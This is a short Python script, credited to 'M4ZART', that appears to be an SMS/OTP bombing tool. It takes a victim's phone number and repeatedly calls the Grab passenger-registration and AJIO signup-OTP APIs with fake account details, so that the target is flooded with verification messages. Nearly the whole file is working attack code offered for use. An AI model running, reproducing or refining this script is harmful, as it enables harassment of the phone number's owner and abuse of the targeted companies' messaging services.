#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by M4ZART
"""
M4ZART
"""
from multiprocessing.pool import ThreadPool
try:
	import os, random
	from time import sleep as turu
	import subprocess as sp
	import requests
except ModuleNotFoundError:
	print("Please İnstall Requests")
	exit()

try:
	os.system('clear')
	print("Contact Me instagram.com/ichbinharun")
	no = input("\033[1;37m[?]Number without '+') =>\033[1;36m ")
	jum=int(input("\033[1;37m[?] Max 4 => \033[1;36m"))
except KeyboardInterrupt:
	print("\nKey interrupt")
	exit()
print()
print("[*] RESULT:")
def main(arg):
	try:
		idk=('phoneNumber')
		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] Success")
		else:
			print("\033[1;31m[-] Error No 20003 Please Contact Developer!")
	except: pass




data = {'firstName':'mashino','login':'randommail@gmail.com','password':'Someone!123','genderType':'Male','mobileNumber':no,'requestType':'SENDOTP'}
        
if int(jum)<=150:
    for i in range(int(jum)):
        response = requests.post('https://login.web.ajio.com/api/auth/signupSendOTP', data=data)
        print(int(i+1))
else:
   print("\033[1;31m[-] Error No 20004 Please Contact Developer!")

jobs = []
for x in range(jum):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print("done ^•^")
